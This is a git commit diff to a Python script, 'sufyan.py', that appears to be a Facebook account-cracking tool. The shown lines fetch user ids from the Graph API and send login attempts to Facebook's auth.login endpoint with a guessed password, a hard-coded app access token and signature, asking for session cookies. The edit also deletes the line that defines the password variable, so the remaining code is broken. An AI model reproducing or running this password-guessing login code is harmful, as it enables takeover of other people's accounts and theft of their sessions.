19b6878fd38fff34bc525f73a7419b25c2c60e1a
sufyanahma <63979270+sufyanahma@users.noreply.github.com>
2021-12-10 01:45:12 +0500

    Update sufyan.py

--- sufyan.py
+++ sufyan.py
@@ -496,7 +496,7 @@ def choice_action():
 		except OSError:
 			pass
 		try:
-		    pass1= name.lower()+p5
+
 			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
 			b = json.loads(a.text)
 			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
